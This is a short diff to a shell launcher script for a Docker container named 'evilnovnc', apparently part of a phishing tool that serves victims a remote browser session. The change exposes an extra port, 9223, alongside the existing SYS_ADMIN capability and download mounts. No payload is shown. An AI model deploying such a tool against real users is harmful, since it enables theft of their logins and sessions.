@@ -39,11 +39,11 @@ if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
 sudo service docker start > /dev/null 2>&1 ; sleep 2 ; fi ; fi
 
 if [[ $RESOLUTION == dynamic ]]; then
-sudo docker run --cap-add=SYS_ADMIN -d --rm -p 80:80 --shm-size=2gb -v "/tmp:/tmp" \
+sudo docker run --cap-add=SYS_ADMIN -d --rm -p 80:80 -p 9223:9223 --shm-size=2gb -v "/tmp:/tmp" \
 -v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
 
 else echo $RESOLUTION > /tmp/resolution.txt
-sudo docker run --cap-add=SYS_ADMIN -d --rm -p 80:80 --shm-size=2gb -v "/tmp:/tmp" \
+sudo docker run --cap-add=SYS_ADMIN -d --rm -p 80:80 -p 9223:9223 --shm-size=2gb -v "/tmp:/tmp" \
 -v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1 ; fi
 
 rm -Rf $PWD/Downloads/*
